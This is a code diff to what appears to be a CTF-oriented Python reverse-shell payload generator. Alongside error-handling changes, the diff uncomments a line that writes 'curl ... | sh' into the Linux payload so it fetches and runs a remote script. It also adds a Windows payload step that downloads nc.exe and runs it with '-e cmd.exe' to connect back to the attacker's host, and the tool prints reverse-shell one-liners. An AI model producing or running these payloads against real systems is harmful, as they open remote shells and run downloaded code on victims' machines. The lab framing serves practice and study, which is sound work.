@@ -6,6 +6,9 @@ import socket
 import ipaddress
 import argparse
 from datetime import datetime
+import concurrent.futures
+import subprocess
+import netifaces
 
 BANNER = r"""
 =========================================================================================================
@@ -19,7 +22,6 @@ def print_banner():
 def get_lhost():
     """Detect VPN (tun0) or fallback to local route."""
     try:
-        import netifaces
         # Priority: tun0 (TryHackMe/HackTheBox VPN), then eth0, then wlan0
         for iface in ['tun0', 'tun1', 'eth0', 'wlan0', 'en0']:
             if iface in netifaces.interfaces():
@@ -27,10 +29,11 @@ def get_lhost():
                 if socket.AF_INET in addrs:
                     return addrs[socket.AF_INET][0]['addr']
     except ImportError:
-        pass
-    except Exception:
-        pass
-    
+        print("[!] The netifaces library is not installed. Please run: pip3 install netifaces")
+        sys.exit(1)
+    except Exception as e:
+        print(f"[-] Error detecting local interface: {e}")
+
     # Fallback: Connect to external IP to determine local route
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -55,6 +58,34 @@ def validate_inputs(target, lport):
         return False
     
     return True
+
+def run_tool(cmd, desc, timeout=300):
+    """Execute tool with comprehensive error handling."""
+    print(f"[+] Running: {desc}")
+    try:
+        result = subprocess.run(
+            cmd,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            text=True,
+            timeout=timeout
+        )
+        if result.returncode == 0:
+            print(f"[+] {desc} completed successfully")
+            return result.stdout
+        else:
+            print(f"[-] {desc} failed with code {result.returncode}")
+            print(result.stdout)
+            return None
+    except subprocess.TimeoutExpired:
+        print(f"[-] {desc} timed out")
+        return None
+    except FileNotFoundError:
+        print(f"[-] {cmd[0]} not found")
+        return None
+    except Exception as e:
+        print(f"[-] {desc} failed: {e}")
+        return None
 
 def generate_payloads(target, lhost, lport):
     """Generate platform-specific reverse shells."""
@@ -107,7 +138,7 @@ def write_linux_payload(target, lhost, lport, payloads):
             # Note: The following runs AFTER shell exits (if it ever does)
             # For CTFs, usually you'd run linpeas manually after getting the shell
             f.write(f"# If we get here, download and run linpeas (optional)\n")
-            f.write(f"# curl -sL {linpeas_url} | sh\n")
+            f.write(f"curl -sL {linpeas_url} | sh\n")
             
         os.chmod(filename, 0o755)  # Make executable
         return filename
@@ -131,7 +162,8 @@ def write_windows_payload(target, lhost, lport, payloads):
             
             # Option 2: If PS fails, download nc.exe and use that
             f.write("# Method 2: Netcat fallback (requires nc.exe)\n")
-            f.write("# (Invoke-WebRequest ... nc.exe ...)\n")
+            f.write(f"Invoke-WebRequest -Uri 'https://example.com/nc.exe' -OutFile 'nc.exe';")
+            f.write(f"./nc.exe -e cmd.exe {lhost} {lport}\n")
             
         return filename
     except Exception as e:
@@ -194,6 +226,8 @@ def main():
         print(f"\n[*] One-liners for target execution:")
         print(f"    Linux:   {payloads['linux_bash']}")
         print(f"    Windows: powershell -c '{payloads['windows_ps'][:80]}...'")
+    else:
+        print("[-] Payload generation failed. Please check inputs and try again.")
 
 if __name__ == "__main__":
     main()
